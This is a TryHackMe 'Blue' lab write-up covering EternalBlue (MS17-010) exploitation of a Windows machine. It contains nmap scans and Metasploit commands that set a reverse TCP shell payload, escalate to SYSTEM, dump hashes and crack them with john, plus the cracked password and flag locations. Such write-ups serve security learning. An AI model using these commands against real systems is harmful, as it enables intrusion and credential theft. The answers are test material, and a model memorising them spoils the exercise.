# TryHackMe — Blue Writeup

## Summary
Blue is a beginner-friendly TryHackMe room exploiting the EternalBlue vulnerability
(MS17-010) on a Windows machine, followed by hash dumping and password cracking.

## Task 1 — Recon

```bash
nmap -sS -Pn -A -p- -T5 TARGET_IP
```

- 3 ports open under 1000
- Machine is vulnerable to **ms17-010**

```bash
nmap -Pn -p 445 TARGET_IP --script smb-vuln-ms17-010.nse
```

## Task 2 — Gain Access

```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set payload windows/x64/shell/reverse_tcp
run
```

## Task 3 — Escalate to SYSTEM

```bash
# Background the shell then convert to meterpreter
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run

# Verify
getsystem
shell
whoami  # NT AUTHORITY\SYSTEM

# Migrate to stable process
ps
migrate PROCESS_ID
```

## Task 4 — Crack the Hash

```bash
hashdump
# Non-default user: Jon

echo "HASH" > hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: alqfna22
```

## Task 5 — Flags

| Flag | Location |
|------|----------|
| Flag 1 | System root `C:\` |
| Flag 2 | SAM database location |
| Flag 3 | Administrator documents |

```bash
search -f flag*.txt
```

## Vulnerabilities

| Step | Vulnerability |
|------|--------------|
| Initial access | MS17-010 EternalBlue SMB exploit |
| Escalation | Shell to Meterpreter + getsystem |
| Post-exploitation | Hash dump + weak password |
